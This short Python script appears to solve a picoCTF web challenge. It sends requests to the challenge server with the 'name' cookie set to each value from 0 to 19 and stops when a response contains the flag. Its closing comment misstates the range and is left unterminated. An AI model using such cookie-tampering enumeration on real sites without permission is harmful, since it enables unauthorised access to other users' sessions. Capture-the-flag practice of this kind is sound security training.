import requests
url = "http://mercury.picoctf.net:64944/check"

for i in range(0, 20):
    text = str(i)
    cookies = {
        'name': text
    }

    r = requests.get(url, cookies=cookies)
    result = r.text

    print(result)
    if 'picoCTF{' in result:
        break


"""
this scripts requests websites with the cookies varying from 1 to 20 and breaks when the format pico{ is found